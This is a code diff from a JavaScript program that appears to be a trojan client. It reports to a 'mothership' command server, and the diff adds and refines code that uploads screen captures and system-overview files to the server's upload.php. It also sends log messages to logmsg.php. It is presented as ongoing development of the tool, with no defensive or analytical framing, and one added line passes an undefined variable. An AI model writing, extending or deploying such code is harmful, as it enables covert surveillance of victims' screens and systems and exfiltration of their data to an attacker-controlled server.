@@ -24,6 +24,7 @@ debugger;
 // test bat, ps1, js, py relay
 
 // --- BUGS ---
+
 // ! execjob script must terminate upon completion --> when finished should exit process
 // ! processless initialisation not working
 
@@ -77,6 +78,8 @@ const crypto = require("crypto");
 const util = require("util");
 
 const ISDEBUG = true;
+
+let LOGMSGMOTHERSHIP = false;
 
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -1555,6 +1558,10 @@ function logmsg(msgstr) {
 
     if (systemstate)
         fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
+
+    if ( LOGMSGMOTHERSHIP )
+        logMsgMothership(msgstr.slice(0, 80));
+
 }
 
 function getTimestamp() {
@@ -4029,23 +4036,20 @@ async function download_screencapture_script() {
     logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 }
 
-
-// TODO
-async function upload_file(filename, jobcode, localfname, localdir) {
+async function upload_file(filename, jobcode, localfpath) {
 
     if ( isNullOrWhitespace(filename) ) {
         throw new Error('filename is null or empty');
     }
 
-    localdir = isNullOrWhitespace(localdir) ? systemstate.trojandir : localdir;
-    localfname = isNullOrWhitespace(localfname) ? filename : localfname;
-    
+    if ( ! fileExists(localfpath) ) {
+        throw new Error(`file does not exist ${localfpath}`);
+    }
+
     let baseUrl = systemstate.mothership + "/ow/upload.php";
 
-    let tfilename = `clientid_${systemstate.clientid}_jobcode_${jobcode}_${localfname}`;
-
     let kvp = systemstate.statekvp;
-    kvp['filename'] = tfilename;
+    kvp['filename'] = filename;
     kvp['jobcode'] = jobcode;
 
     let response = await makePUTRequest(
@@ -4075,9 +4079,11 @@ function exec_getscreencapture() {
     });
 }
 
-// TODO anchor
+// TODO
 // implement logging mechanism to write log msgs back to mothership
 async function getscreencapture() {
+    LOGMSGMOTHERSHIP = true;
+
     logmsg("starting");
 
     let runningcmd = systemstate.cmdconfig;
@@ -4106,10 +4112,13 @@ async function getscreencapture() {
             let fpath = line.split('=')[1];
             let fname = path.basename(fpath);
 
-            await upload_file(fname,runningcmd.jobcode);
+            let ret = await upload_file(fname,runningcmd.jobcode,fpath);
+
+            // TODO logmsg file upload
         }
     }
     
+    process.exit(0);
     // TODO: log event job_finished
 }
 
@@ -4151,8 +4160,10 @@ function errorToJson(error) {
 
 // TODO invoke logEventMothership 'job_started', 'job_finished', 'job_finished_with_error'
 async function getsystemoverview() {
-    logmsg("starting");
+    LOGMSGMOTHERSHIP = true;
 
+    logmsg("starting");
+   
     let runningcmd = systemstate.cmdconfig;
     let config = runningcmd.config;
 
@@ -4206,10 +4217,9 @@ async function getsystemoverview() {
 
     fs.writeFileSync(localfpath, outjson_str, "utf-8");
 
-    // BUG runningcmd.jobcode is undefined anchor
     let baseUrl = systemstate.mothership + "/ow/upload.php";
 
-    let filename = `clientid_${systemstate.clientid}_jobcode_${runningcmd.jobcode}_getsystemoverview.out`;
+    let filename = 'getsystemoverview.out';
 
     let kvp = systemstate.statekvp;
     kvp['filename'] = filename;
@@ -4229,9 +4239,16 @@ async function getsystemoverview() {
 
 // ---
 
-// TODO
+// TODO anchor
 function logMsgMothership(msg) {
-    // TODO: inspect msg, if str, if obj
+
+    let baseUrl = systemstate.mothership + '/ow/logmsg.php';
+
+    let kvp = systemstate.statekvp;
+
+    kvp['msg'] = msg;
+
+    let response = makeGetRequest(baseUrl, params);    
 }
 
 // TODO
